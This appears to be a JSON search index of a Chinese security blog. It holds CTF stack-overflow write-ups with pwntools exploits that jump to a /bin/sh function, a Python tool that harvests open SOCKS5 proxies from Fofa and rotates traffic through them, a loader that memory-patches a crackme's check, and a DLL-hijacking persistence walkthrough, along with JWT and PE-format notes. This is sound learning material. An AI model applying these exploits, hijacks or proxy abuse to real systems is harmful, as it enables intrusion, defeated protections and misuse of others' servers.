分析什么东西写进了SystemCall中\npwndbg\u0026gt; x /s 0x40201b 0x40201b:\t\u0026#34;/bin/sh\u0026#34; 现在知道shell在哪了只需要通过溢出跳到Fun上执行就行了: Fun的方法的地址是0x401186 现在可以构造Exp了\n1.2 Exp构造 1、需要先溢出 2、溢出之后rip的地址要等于Fun的内存地址\nfrom pwn import* #sh = remote(\u0026#39;node4.buuoj.cn\u0026#39;, \u0026#39;25257\u0026#39;) sh = process(\u0026#39;./pwn1\u0026#39;) #raw_input() payload = b\u0026#39;a\u0026#39;*0x17+p64(0x40118A) sh.recvuntil(\u0026#39;nput\\n\u0026#39;) sh.sendline(payload) sh.interactive() char s[15]; 首先要溢出这个可用通过gets((__int64)s, (__int64)argv); 这个函数来溢出\nchar s[15] 需要写入多少可以进行溢出？ 可以通过Pwngdb走到char s[15]看申请了多大空间\n0x401156 \u0026lt;main+20\u0026gt; lea rax, [rbp - 0xf] char s[15] [stack] 00:0000│ rsp rax-1 0x7fffffffdf90 —▸ 0x7fffffffe090 ◂— 0x1 01:0008│-008 0x7fffffffdf98 ◂— 0x0 02:0010│ rbp 0x7fffffffdfa0 ◂— 0x0 03:0018│+008 0x7fffffffdfa8 —▸ 0x7ffff7de7083 (__libc_start_main+243) ◂— mov edi, eax 一共是0x17byte 。 一个push rbp占8byte ，但是要减一，因为char最后一个是个0 就是0x17 ，正好覆盖到rbp。然后覆盖rip地址就行了覆盖成0x40118A\n","permalink":"http://guozhi1.github.io/posts/pwn/buuctfrip%E8%A7%A3%E9%A2%98/","summary":"1.1 分析源码 先看下保护措施 [*] \u0026#39;/home/guozhi/桌面/pwn1\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO GOT表写保护 Stack: No canary found 无金丝雀保护 NX: NX unknown - GNU_STACK missing 内存页 无不可执行保护 PIE: No PIE (0x400000) 无地址随机化 Stack: Executable 栈可执行 RWX: Has RWX segments 有可读可写可执行 int __cdecl main(int argc, const char **argv, const char **envp) { char s[15]; // [rsp+1h] [rbp-Fh] BYREF puts(\u0026#34;please input\u0026#34;); gets((__int64)s, (__int64)argv); //主要是这里产生了","title":"[BUUCTF]rip栈溢出解题"},{"content":"要在Liunx 系统下跑\n栈溢出 通过程序的输入但是并没做长度限制导致栈溢出，栈溢出的攻击手法通过覆盖栈的rbp下面的ret返回的地址返回到想要执行的目标地址，从而达到控制执行程序执行流。\n1.1 源码 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void y0u_c4n7_533_m3() { execve(\u0026#34;/bin/sh\u0026#34;, (char *[]){0}, (char *[]){0}); } int main() { char buf[16]; puts(\u0026#34;This is your first bof challenge ;)\u0026#34;); fflush(stdout); read(0, buf, 0x30); return 0; } 1.2 解法 y0u_c4n7_533_m3 是主要的目标通过栈溢出控制程序的执行流从而执行y0u_c4n7_533_m3 得到一个Shell\n1.1.1 获取函数的地址 想要栈溢出执行y0u_c4n7_533_m3需要先知道这个函数处在一个内存的什么位置使用objdump就可以得到\nobjdump -d ./bof -Mintel 就可以的得到函数的内存位置0000000000400607 \u0026lt;y0u_c4n7_533_m3\u0026gt;:\n1.1.2 溢出点 read(0, buf, 0x30); 这就是一个可以溢出的点。 buf是16 但是读了0x30个byte就可以往下读6个地址。 char buf[16]; 汇编是 lea rax, [rbp - 0x10] 栈空间大小是0x10哪就占用了两个栈地址这个栈地址下面就是rbp再下面就是ret我们要覆盖的地址， 两个栈地址（0x8+0x8） + rbp (0x8) = 0x18 覆盖0x18正好可以溢出后面在加上0000000000400607 \u0026lt;y0u_c4n7_533_m3\u0026gt; 这个地址就可以ret到这个程序的执行流了。\n1.3 Exp #!/bin/python3 from pwn import * r = process(\u0026#39;./bof\u0026#39;) addr = 0x400607 p = b\u0026#39;a\u0026#39; * 0x18 + p64(addr) r.recvuntil(\u0026#39;;)\\n\u0026#39;) r.send(p) r.interactive() ","permalink":"http://guozhi1.github.io/posts/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/","summary":"要在Liunx 系统下跑 栈溢出 通过程序的输入但是并没做长度限制导致栈溢出，栈溢出的攻击手法通过覆盖栈的rbp下面的ret返回的地址返回到想要执行的目标地址，从而达到控制执行程序执行流。 1.1 源码 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void y0u_c4n7_533_m3() { execve(\u0026#34;/bin/sh\u0026#34;, (char *[]){0}, (char *[]){0}); } int main() { char buf[16]; puts(\u0026#34;This is your first bof challenge ;)\u0026#34;); fflush(stdout); read(0, buf, 0x30); return 0; } 1.2 解法 y0u_c4n7_533_m3 是主要的目标通过","title":"Pwn经典漏洞栈溢出"},{"content":"proxy从互联网收集代理的编写 借鉴的代码SmallProxyPool\n一、代码的结构 我在分析SmallProxyPool代码之后找到了几个基础的结构用这些基础的结构就可以编写一个手机互联网代理的工具\n收集模块 通过Fofa搜索到互联网上的Sockt5资产 检测模块 通过检测看什么Sockt5不需要账密并且可以发送和接收流量 流量转发模块 把本机的流量转发到远程的Sockt5服务器上 二、代码实现 1.收集模块 读取配置文件 调用Fofa接口发挥数据 存放到数组里 def getSocks5Data(): # 获取节点 rule = base64.b64encode(con[\u0026#39;config\u0026#39;][\u0026#39;rule\u0026#39;].encode()) counter = 0 nextPages = \u0026#34;\u0026#34; while True: url = \u0026#34;https://fofa.info/api/v1/search/next?email={}\u0026amp;key={}\u0026amp;qbase64={}\u0026amp;size=1000\u0026amp;next={}\u0026#34;.format(emali, key, rule.decode(), nextPages) if counter == 0: url = \u0026#34;https://fofa.info/api/v1/search/next?email={}\u0026amp;key={}\u0026amp;qbase64={}\u0026amp;size=1000\u0026#34;.format(emali, key,rule.decode()) counter += 1 ScoketData = requests.get(url, headers=Heade) try: nextPages = ScoketData.json()[\u0026#39;next\u0026#39;] # 获取一次next print(nextPages) if nextPages != \u0026#34;\u0026#34; or ScoketData.json()[\u0026#39;error\u0026#39;]: # 不为空就添加一个next print(\u0026#34;[~]正在翻页\u0026#34;) else: break list_tmp = ScoketData.json()[\u0026#39;results\u0026#39;] for item in list_tmp: ListProxy.append(item[0]) except: break 2.检测模块 使用多线程对收集的url进行测试\ndef ThreadcheckAlive(): with ThreadPoolExecutor(max_workers=100) as executor: futures = [executor.submit(checkAlive, proxy) for proxy in ListProxy] for future in as_completed(futures): result = future.result() if result is not None: print(f\u0026#34;Result: {result}\u0026#34;) 然后使用进入checkAlive方法判代理是否联通\ndef checkAlive(ProxyIpProt): proxies = { \u0026#34;http\u0026#34;: \u0026#34;socks5://\u0026#34; + ProxyIpProt, \u0026#34;https\u0026#34;: \u0026#34;socks5://\u0026#34; + ProxyIpProt, } try: Hea_req = requests.head(\u0026#34;http://www.baidu.com\u0026#34;, headers=Heade, proxies=proxies, timeout=1, verify=False) if Hea_req.status_code == 200: #print(len(Hea_req.text)) filteredProxy.append(ProxyIpProt) print(ProxyIpProt) except(Exception): pass 这个代码很简单通过socks5去测试每个节点的的响应包如果返回200则代表可以来联通\n3、流量转发模块 流量转发模块实现的主要是Sock5的本地监听然后把流量 轮询的发送到远程的Socks5服务器上\n流量的接收和发送可以使用多线程。\nimport socket import threading import FofaProxy import random # 定义一个函数，用于将数据从源套接字转发到目标套接字 def forward_data(src, dest): while True: data = src.recv(4096) # 从源套接字接收数据 print(data) if not data: # 如果接收到的数据为空，跳出循环 break dest.sendall(data) # 将数据发送到目标套接字 # 主函数 def SocktStart(List_Proxy): # proxy_list = [\u0026#34;218.62.55.221:1080\u0026#34;,\u0026#34;61.160.213.169:1080\u0026#34;,\u0026#34;106.52.247.90:20005\u0026#34;,\u0026#34;124.221.108.177:1080\u0026#34;,\u0026#34;223.112.196.124:1080\u0026#34;] # proxy_list_len = len(List_Proxy) print(List_Proxy) print(\u0026#34;我被运行\u0026#34;) local_host = \u0026#34;127.0.0.1\u0026#34; # 本地主机地址 local_port = 10808 # 本地端口号 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 创建服务器套接字 server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # 设置套接字选项 server_socket.bind((local_host, local_port)) # 绑定本地主机地址和端口号 server_socket.listen(5) # 开始监听连接请求 print(f\u0026#34;[*] Listening on {local_host}:{local_port}\u0026#34;) # 输出监听信息 while True: client_socket, addr = server_socket.accept() # 接受客户端连接请求 print(f\u0026#34;[*] Accepted connection from: {addr[0]}:{addr[1]}\u0026#34;) # 输出连接信息 Proxy = List_Proxy[random.randint(0, proxy_list_len-1)] IpHost = Proxy.split(\u0026#34;:\u0026#34;)[0] HProt = Proxy.split(\u0026#34;:\u0026#34;)[1] remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 创建远程套接字 remote_socket.connect((IpHost, int(HProt))) # 连接到远程主机列表中的第一个主机 # 创建两个线程，分别将数据从客户端套接字转发到远程套接字，以及从远程套接字转发到客户端套接字 forward_thread = threading.Thread(target=forward_data, args=(client_socket, remote_socket)) forward_thread.start() forward_thread = threading.Thread(target=forward_data, args=(remote_socket, client_socket)) forward_thread.start() ","permalink":"http://guozhi1.github.io/posts/tech/proxy%E4%BB%A3%E7%90%86%E7%BC%96%E5%86%99/","summary":"proxy从互联网收集代理的编写 借鉴的代码SmallProxyPool 一、代码的结构 我在分析SmallProxyPool代码之后找到了几个基础的结构用这些基础的结构就可以编写一个手机互联网代理的工具 收集模块 通过Fofa搜索到互联网上的Sockt5资产 检测模块 通过检测看什么Sock","title":"Proxy代理编写"},{"content":"Win32调试Api Win32自带了一些api函数，他们相当于调试器的大部分功能，这些函数称为Win32调试Api。 利用这些Api，可以加载一个程序或捆绑到一个正在运行的程序上以供调试。可以获得调试程序底层信息，甚至可以对被调试程序进行任意修改。\n1.调试相关函数说明 BOOL ContinueDebugEvent() ","permalink":"http://guozhi1.github.io/posts/blog/win32%E8%B0%83%E8%AF%95api/","summary":"Win32调试Api Win32自带了一些api函数，他们相当于调试器的大部分功能，这些函数称为Win32调试Api。 利用这些Api，可以加载一个程序或捆绑到一个正在运行的程序上以供调试。可以获得调试程序底层信息，甚至可以对被调试程序进行任意修改。 1.调试相关函数说明 BOOL ContinueDebugEvent()","title":"Win32调试api"},{"content":"补丁技术 逆向工程中，经常需改更改程序的原有执行流程，使其增加或减少一些功能代码。这就需要给原有的文件添加补丁。\r补丁分为两种文件补丁和内存补丁，文件补丁修改文件本身的某个数据，内存补丁是在内存中修改数据。\n1.文件补丁 文件补丁直接对二进制可执行文件进行修改使其满足需求。文件补丁实现很加简单，对修改前的文件与修改后的文件进行比较操作，把不同之处记录下来，然后写一个程序实现补丁功能\n有以下优点：\n理论简单、实施容易：只需要通过基本的十六进制操作就可以完成任务。 有很多的现成的补丁工具 2.内存补丁 文件补丁虽然简单但是有局限性，如果文件被加壳、或压缩壳或文件完整性校验则无法顺利使用补丁。由此产生了内存补丁技术\n内存补丁的思想是在，目标程序的地址空间中修改数据\n2.1 跨进程内存存取机制 就程序设计原则而言， 运行同一个系统的进程A和进程B之间应该完全“绝缘”的，也就是说，一个进程的地址、指令、内存使用等信息另一个进程完全是透明的，说的更高级一点，操作系统应该对运行其中的所有进程进行“封装”。但是封装和灵活从来都是一对矛盾。再C++中为了达到两者的平衡，引入了Friend关键字，以及public、private、protected存储概念。同样对操作系统而言，对进程进行封装的同时，也需要提供一种再一定条件下可以实现进程之间的互访机制。作为最简单的“进程互访”动作, 内存的存期是最重要的功能。 Windows提供了两个进程之间互访的函数ReadProcessMemory和WriteProcessMemory, 只需要打开进程权限，就可以读写进程的地址空间。\n在整个运行过程中，Loader载入待打补丁的状态城西可以由CreateProcess函数实现，资源释放，清理工作可以由ExitProcess函数完成。整个核心的流程就是中间的Loader对创建出来的待打补丁进程的控制与修改，通过WriteProcessMemory函数写道目标进程的适当位置\n#include \u0026lt;Windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; #define PATCH_ADDRESS 0x4011F5 using namespace std; int main() { LPCWSTR sizeFile = L\u0026#34;F:\\\\C++\\\\内存补丁\\\\Debug\\\\TraceMe.exe\u0026#34;; //文件位置 byte TarGetData[] = {0x74, 0x37}; //修改前的代码 byte newTarGetData[] = {0x90, 0x90}; //修改后的代码 byte ReadBuffer[128] = { 0 }; bool TASTARTRUNFalg = true; DWORD Oldpp; STARTUPINFOW si = {0}; PROCESS_INFORMATION pi = { 0 }; if (!CreateProcess(sizeFile, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, \u0026amp;si, \u0026amp;pi)) { cout \u0026lt;\u0026lt; \u0026#34;程序挂起异常\u0026#34; \u0026lt;\u0026lt; endl; return FALSE; } while (TASTARTRUNFalg) { ResumeThread(pi.hThread); //运行线程 Sleep(1000); //给个时间让加载 SuspendThread(pi.hThread); //挂起线程 /*BOOL ReadProcessMemory( //读取内存 [in] HANDLE hProcess, 进程句柄 [in] LPCVOID lpBaseAddress, 指向从中读取的指定进程中基址的指针 [out] LPVOID lpBuffer, 指向从指定进程的地址空间接收内容的缓冲区的指针。 [in] SIZE_T nSize, 修改大小 [out] SIZE_T * lpNumberOfBytesRead );*/ ReadProcessMemory(pi.hProcess, (LPVOID)PATCH_ADDRESS, \u0026amp;ReadBuffer, 2, NULL); if (!memcmp(TarGetData, ReadBuffer, 2)) { /*\tBOOL VirtualProtectEx( 修改提交内存的保护区 [in] HANDLE hProcess, [in] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flNewProtect, [out] PDWORD lpflOldProtect );*/ VirtualProtectEx(pi.hProcess, (LPVOID)PATCH_ADDRESS, 2, 0x40, \u0026amp;Oldpp); WriteProcessMemory(pi.hProcess, (LPVOID)PATCH_ADDRESS, \u0026amp;newTarGetData, 2,NULL); ResumeThread(pi.hThread); TASTARTRUNFalg = FALSE; } } CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; } 以上代码实现了再指定的内存区域修改特征码从而跳过验证，使用ReadProcessMemory函数读取特定的内容进行校验工作。因为补丁代码是与程序代码精准对应的，所以在运行WriteProcessMemory函数之前去做校验是有必要的。\n读取内容后进行校验后， 调用WriteProcessMemory函数将数据写入到指定位置，这个方法缺陷是很明显的在CreateProcess进程之后需要马上进入Suspend挂起目标，等打完补丁后在运行程序。\n理想状况是采用一种\u0026quot;通知机制\u0026quot;也就是在程序eip=[目标位置]时发送一个消息，收到消息后在进行补丁操作，这还需要系统更底层的支持DebugApi则可以有这种作用\n1.3 DebugApi 机制 ","permalink":"http://guozhi1.github.io/posts/tech/%E8%A1%A5%E4%B8%81%E6%8A%80%E6%9C%AF/","summary":"补丁技术 逆向工程中，经常需改更改程序的原有执行流程，使其增加或减少一些功能代码。这就需要给原有的文件添加补丁。 补丁分为两种文件补丁和内存补丁，文件补丁修改文件本身的某个数据，内存补丁是在内存中修改数据。 1.文件补丁 文件补丁直接对二进制可执行文件进行修改使其满足需求。文件补丁实现很","title":"补丁技术"},{"content":"知识文献\n1.JWT介绍 jwt是一种用于身份验证和授权的开放标准,通过网络应用间的传递加密的json。jwt的攻击途径有例如：特权升级、信息泄露、sqli , xss, ssrf,rce, LFI等。\n2.基础概念 JWS: singed jwt 签名过的jwt JWK: JWT的密钥，常说的的SECRET JWE: encrypted JWT的部分payload经过加密的JWT JKU: jwt的header字段，字段内容是一个url、 该url指定 验证令密钥的服务、该服务器用于回复jwk X5U: x5u是jwt hearder中的一个字段，指向一组x509公共证书的url,jku功能类似 x.509标准：x.509标准是密码学里的公钥证书标准格式，包括LTS/SSL在内的 3.基本结构 jwt(json web Token)的基本机构分别是Header, payload和signature。\nHeader Header包含了JWT使用的算法和类型等元数据信息，通常使用json对象表示并使用base64进行编码。Header中包含两个字段alg和typ\nalg(algorithm)指定了加密算法\ntyp(type)制定了jwt的类型通常为jwt\n{ \u0026#34;alg\u0026#34;:\u0026#34;HS256\u0026#34;, \u0026#34;typ\u0026#34;:\u0026#34;JWT\u0026#34; } 其中alg指定了使用HMAC-SHA256算法进行签名，typ指定了JWT的类型为JWT\npayload payload 包jwt的主要信息，通常使用json对象并使用base64编码，payload中包含三类型的字段：注册声明、公共声明和私有声明\n公共声明 是自定义字段，用于传递非敏感信息， 用户ID 角色 私有声明 是自定义字段 ，传递敏感信息，密码、信用卡号。 注册声明 预定义的标准字段， 发行者，过期时间等\npayload { \u0026#34;sub\u0026#34;:\u0026#34;123456789\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;john Doe\u0026#34;, \u0026#34;iat\u0026#34;:1516239022 } 其中sub表示主题，name表示名称，iat表示JWT的签发时间\n","permalink":"http://guozhi1.github.io/posts/tech/jwt%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","summary":"知识文献 1.JWT介绍 jwt是一种用于身份验证和授权的开放标准,通过网络应用间的传递加密的json。jwt的攻击途径有例如：特权升级、信息泄露、sqli , xss, ssrf,rce, LFI等。 2.基础概念 JWS: singed jwt 签名过的jwt JWK: JWT的密钥，常说的的SECRET JWE: encrypted JWT的部分payload经过加密的JW","title":"Jwt漏洞学习"},{"content":"1.数据对齐 数据对齐cpu的结构一部分, 对齐可以提升执行效率，当数据大小的数据模数的内存地址是0的时候，数据是对齐的。例如 word值总是能被2除尽的地方开始，而dword值总是被4除尽的地方开始， x86可以对未对其的数据进行调整，但是代价是cpu的资源。\n在windows中\n","permalink":"http://guozhi1.github.io/posts/tech/%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/","summary":"1.数据对齐 数据对齐cpu的结构一部分, 对齐可以提升执行效率，当数据大小的数据模数的内存地址是0的时候，数据是对齐的。例如 word值总是能被2除尽的地方开始，而dword值总是被4除尽的地方开始， x86可以对未对其的数据进行调整，但是代价是cpu的资源。 在windows中","title":"二次开发"},{"content":"1. Hook技术 hook的手段就是“钩住”关心的程序流并 并根据需要进行干预的动作\n1.1 IAT HOOK篡改MessageBox消息 ","permalink":"http://guozhi1.github.io/posts/tech/hook%E6%8A%80%E6%9C%AF/","summary":"1. Hook技术 hook的手段就是“钩住”关心的程序流并 并根据需要进行干预的动作 1.1 IAT HOOK篡改MessageBox消息","title":"Hook技术"},{"content":"DLL劫持技术 1、介绍 DLL劫持技术是一种权限维持的手段， 通过劫持正常程序DLL的执行流让程序执行恶意代码。\n流程\n正常程序 \u0026mdash;-调用\u0026mdash;-\u0026raquo; 正常的DLL \u0026mdash;-执行\u0026mdash;\u0026raquo; 正常功能 DLL劫持就可以通过劫持正常的DLL, 让恶意的DLL被正常的程序调用。\n正常程序 \u0026mdash;-调用\u0026mdash;-\u0026raquo; 恶意DLL \u0026mdash; 执行 \u0026mdash;\u0026raquo; 恶意代码 \u0026mdash;转发\u0026mdash;\u0026raquo; 正常DLL \u0026mdash;执行\u0026mdash;\u0026raquo; 执行正常功能 2、DLL介绍 DLL中文名动态链接库 你可以把它看作一个自身无法执行的exe程序通过exe对DLL操作调用DLL里的方法实现相对应的功能\n学DLL劫持就学两点就行\nDLL生命周期 DLL导出函数 2.1、 DLL生命周期 DLL生命周期是指DLL从加载到卸载的个个状态，下面看代码DLL默认就是\n#include \u0026#34;pch.h\u0026#34; BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) //DLL的入口函数 { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: //DLL被加载时候执行 case DLL_THREAD_ATTACH: //线程被创建的时候执行 case DLL_THREAD_DETACH: //线程结束时执行 case DLL_PROCESS_DETACH: //DLL被卸载时执行 break; } return TRUE; } 这就是DLL的生命周期 执行到对应的生命周期会执行对应的case代码块\n2.2、DLL导出函数 DLL导出函数是DLL提供对外部的函数， 外部的程序可以通过加载DLL访问导出函数从而执行导出函数的功能。\n这是DLL里的导出函数\n//语言类型 调用约定 extern \u0026#34;C\u0026#34; __declspec(dllexport) void aaa() { MessageBoxA(NULL,\u0026#34;我是导出函数\u0026#34;, \u0026#34;aaaa\u0026#34;, MB_OK); } 完整的DLL代码\n// dllmain.cpp : 定义 DLL 应用程序的入口点。 #include \u0026#34;pch.h\u0026#34; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; extern \u0026#34;C\u0026#34; __declspec(dllexport) void aaa() { MessageBoxA(NULL,\u0026#34;我是导出函数\u0026#34;, \u0026#34;aaaa\u0026#34;, MB_OK); } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: MessageBoxA(NULL, \u0026#34;DLL加载case\u0026#34;, \u0026#34;aaa\u0026#34;, MB_HELP); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 写一个程序调用DLL文件\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;Windows.h\u0026gt; typedef void(*Func)(); //DLL中的函数被默认为私有函数，不会被其他程序调用。因此，需要通过定义导出函数以便其他程序能够调用它们。 int main() { HINSTANCE hinst = LoadLibraryA(\u0026#34;TestDLL.dll\u0026#34;); //执行到这的时候会调用 MessageBoxA(NULL, \u0026#34;DLL加载case\u0026#34;, \u0026#34;aaa\u0026#34;, MB_HELP); Func GetDLLFunc = (Func)GetProcAddress(hinst, \u0026#34;aaa\u0026#34;); GetDLLFunc(); //执行到这执行导出函数 MessageBoxA(NULL,\u0026#34;我是导出函数\u0026#34;, \u0026#34;aaaa\u0026#34;, MB_OK); return 0; } 执行第一次弹出弹窗，是DLL被加载的弹窗。 点击确定后，弹出了第二个弹窗，这显示是导出函数被加载执行了。 3、DLL劫持 现在要完成DLL劫持的流程：\n正常程序 \u0026mdash;-调用\u0026mdash;-\u0026raquo; 恶意DLL \u0026mdash; 执行 \u0026mdash;\u0026raquo; 恶意代码 \u0026mdash;转发\u0026mdash;\u0026raquo; 正常DLL \u0026mdash;执行\u0026mdash;\u0026raquo; 执行正常功能\n正常情况下我们没正常程序的DLL源码\n通过Process Monitor找到程序调用神那么DLL文件从而修改。 这样就可以看到都加载了什么DLL文件\n然后使用工具AheaLib.exe 得到转发 // 头文件 #include \u0026lt;Windows.h\u0026gt; // 导出函数 #pragma comment(linker, \u0026#34;/EXPORT:aaa=TestDLLOrg.aaa,@1\u0026#34;) // 入口函数 BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved) { if (dwReason == DLL_PROCESS_ATTACH) //当DLL被加载到进程的地址空间时会执行。 { DisableThreadLibraryCalls(hModule); //DisableThreadLibraryCalls用来决定DLL线程通知开启与关闭 什么是线程通知 DLL_PROCESS_ATTACH 和 DLL_PROCESS_DETACH 这种就是线程通知 } else if (dwReason == DLL_PROCESS_DETACH) //当DLL被卸载的时候执行 { MessageBoxW(NULL, L\u0026#34;aaa\u0026#34;, L\u0026#34;tttt\u0026#34;, 0x2L); //我自己写的充当恶意代码 } return TRUE; } 把原来的TestDLL改名为TestDLLOrg。 编译这个DLL文件替换掉原来的TestDLL文件。 ","permalink":"http://guozhi1.github.io/posts/tech/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF/","summary":"DLL劫持技术 1、介绍 DLL劫持技术是一种权限维持的手段， 通过劫持正常程序DLL的执行流让程序执行恶意代码。 流程 正常程序 \u0026mdash;-调用\u0026mdash;-\u0026raquo; 正常的DLL \u0026mdash;-执行\u0026mdash;\u0026raquo; 正常功能 DLL劫持就可以通过劫持正常的DLL, 让恶","title":"DLL劫持技术"},{"content":"","permalink":"http://guozhi1.github.io/posts/read/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1jspxcms/","summary":"","title":"Java代码审计jspxcms"},{"content":"参考资料\n1. PE文件格式由来 微软在推出PE文件格式之前的操作系统都是用的LE文件格式， 推出PE文件格式是为了让一个程序在所有Windows x86平台通用一个文件格式，这样系统的装载器和编程工具无需对新出的CPU进行重写，在WindowsNT之后就拥有了相同的文件格式。\n64位Windows只是对PE进行简单的修饰新格式叫PE32+，没有新的结构增加只是简单的把32位字段扩展为64位\nPE文件的框架结构 2.PE文件基本概念 PE文件所有代码与数据都合并在了一起， 组成了一个很大的结构，文件的内容会被区分成不同的区块，每个块都会有自己的内存属性，例如这个这个块师傅包含代码，是否可读或者可写\n3.DOS头 DOS头的结构体\ntypedef struct _IMAGE_DOS_HEADER {　// DOS-MZ文件头 WORD　e_magic;　// DOS 可执行文件的标识符 WORD　e_cblp;　// Bytes on last page of file WORD　e_cp;　// Pages in file WORD　e_crlc;　// Relocations WORD　e_cparhdr;　// Size of header in paragraphs WORD　e_minalloc;　// Minimum extra paragraphs needed WORD　e_maxalloc;　// Maximum extra paragraphs needed WORD　e_ss;　// Initial (relative) SS value WORD　e_sp;　// Initial SP value WORD　e_csum;　// ChecksumWORD　e_ip;　// Initial IP valueWORD　e_cs;　// Initial (relative) CS value WORD　e_lfarlc;　// File address of relocation table WORD　e_ovno;　// Overlay number WORD　e_res[4];　// Reserved words WORD　e_oemid;　// OEM identifier (for e_oeminfo) WORD　e_oeminfo;　// OEM information; e_oemid specific WORD　e_res2[10];　// Reserved words LONG　e_lfanew;　// PE 签名的文件偏移量 } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; WORD 占2个字节 LONG占用4 个字节 142+24+2*10+4=60 字节 但是并不止占60字节，实际上占用64字节，为了内存对齐的目的，_IMAGE_DOS_HEADER的大小会被舍入为下一个最接近的按4字节对齐的值。\nDOS头只需要看重两个位置： e_magic DOS头标识 e_lfanew 指向PE文件头位置\n左下角的大小的64字节 DOS标识头是 4D 5A 第二个红框 指向PE文件头偏移位置 00 00 00\n4.PE文件头 PE签名 PE签名占4个字节 PE文件分为三个部分\ntypedef struct _IMAGE_NT_HEADERS { DWORD Signature; //该结构体中的Signature就是PE签名，标识该文件是否是PE文件。该部分占4字节，即“50 45 0000”。 IMAGE_FILE_HEADER FileHeader; //标准头PE IMAGE_OPTIONAL_HEADER32 OptionalHeader; //扩展头PE } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; PE签名Signature占4个字节， FileHeader 是PE的标准头20个字节，OptionalHeader 是PE的扩展头 大小不定 。\n标准PE头 是PE的标准头20个字节。 typedef struct _IMAGE_FILE_HEADER { WORD　Machine; // 标识目标计算机类型的数字。 WORD　NumberOfSections; // 区段数量。 DWORD　TimeDateStamp; // 自1970年1月1日00：00起的秒数的低 32 位 (C 运行时time_t值) ，该值指示文件创建时间。 DWORD　PointerToSymbolTable; // COFF符号表的文件偏移量，如果没有COFF符号表，则为零。映像的此值应为零，因为 COFF 调试信息已弃用。 DWORD　NumberOfSymbols; // 符号表中的条目数。此数据可用于查找紧跟在符号表后面的字符串表。映像的此值应为零，因为 COFF 调试信息已弃用。 WORD　SizeOfOptionalHeader; // 可选标头的大小，这是可执行文件所必需的。 WORD　Characteristics; // 指示文件属性的标志。 } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 主要的四个变量\nMachine\n说明PE文件只能在哪些CPU类型或模拟指定计算机的系统上运行。 NumberOfSections\n区段数量 5 个 SizeOfOptionalHeader\nPE可选头的大小 00 E0 十进制就是 224 Characteristics\n指示文件属性的标志 0102 然后对照表进行解读 这是一个平台为32位机器，文件可执行\n分辨一个程序平台架构可以，综合两个参数来看一个是Machine字段和SizeOfOptionalHeader字段\nMachine 一般情况下，如果Machine字段的值为0x014C，表示程序是32位的，它适用于x86架构。如果Machine字段的值为0x8664，表示程序是64位的，适用于x64架构。\nSizeOfOptionalHeader PE32是32位的可选头格式，用于支持x86架构的应用程序。它的大小固定为224字节。 PE32+是64位的可选头格式，用于支持x64架构的应用程序。它的大小固定为240字节。\n扩展PE头 数据结构\ntypedef struct _IMAGE_ROM_OPTIONAL_HEADER { WORD Magic; //标识头 PE32 还是PE32+ 或 ROM文件 BYTE MajorLinkerVersion; //连接器主要版本 BYTE MinorLinkerVersion; //连接器次要版本 DWORD SizeOfCode; //所有文本和代码的总和 DWORD SizeOfInitializedData; //初始化数据部分大小 DWORD SizeOfUninitializedData; //未初始化数据部分大小 DWORD AddressOfEntryPoint; //程序载入内存中的映像基地址地址 DWORD BaseOfCode; //PE载入内存中的相对于模块的基地址偏移 DWORD BaseOfData; DWORD BaseOfBss; DWORD GprMask; DWORD CprMask[4]; DWORD GpValue; } IMAGE_ROM_OPTIONAL_HEADER, *PIMAGE_ROM_OPTIONAL_HEADER; Magic PE格式 0x10b PE32 0x20b PE32+ 0x107 ROM映像 ","permalink":"http://guozhi1.github.io/posts/blog/pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/","summary":"参考资料 1. PE文件格式由来 微软在推出PE文件格式之前的操作系统都是用的LE文件格式， 推出PE文件格式是为了让一个程序在所有Windows x86平台通用一个文件格式，这样系统的装载器和编程工具无需对新出的CPU进行重写，在WindowsNT之后就拥有了相同的文件格式。 64位Wind","title":"PE文件格式"},{"content":"一、WidnowsHOOK分类 系统钩子（System Hooks）：系统钩子是最常见的一类钩子，用于监视和修改系统级别的事件。系统钩子可以捕获和处理各种系统事件，如键盘输入、鼠标消息、窗口消息等。系统钩子可以全局范围内生效，可以对整个系统中的事件进行拦截和处理。\n应用程序钩子（Application Hooks）：应用程序钩子是针对特定应用程序的钩子，用于监视和修改特定应用程序的行为。应用程序钩子可以捕获和处理应用程序级别的事件，如窗口消息、菜单消息、定时器消息等。应用程序钩子只对指定的应用程序生效。\n线程钩子（Thread Hooks）：线程钩子是针对特定线程的钩子，用于监视和修改特定线程的行为。线程钩子可以捕获和处理特定线程的事件，如窗口消息、键盘输入等。线程钩子只对指定的线程生效。\n子类钩子（Subclass 